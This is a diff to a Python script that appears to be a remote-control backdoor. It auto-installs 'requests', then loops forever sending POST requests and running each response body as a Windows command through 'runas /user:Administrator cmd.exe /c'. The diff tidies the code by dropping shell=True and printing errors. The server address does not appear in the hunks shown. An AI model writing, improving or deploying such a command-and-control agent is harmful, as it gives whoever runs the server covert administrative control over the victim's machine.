@@ -1,11 +1,11 @@
 import subprocess
 import os
 import time
+
 try:
     import requests
 except ImportError:
     subprocess.run(["pip", "install", "requests"])
-    # Перезапускаем скрипт
     subprocess.run(["python", __file__])
     exit()
 
@@ -20,11 +20,11 @@ def send_post_request():
 
         if response.status_code == 200:
             command = response.text.strip()
-            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command], shell=True)
+            subprocess.run(["runas", "/user:Administrator", "cmd.exe", "/c", command])
         else:
             pass
     except Exception as e:
-        pass
+        print("Error:", e)
 
 if __name__ == "__main__":
     while True:
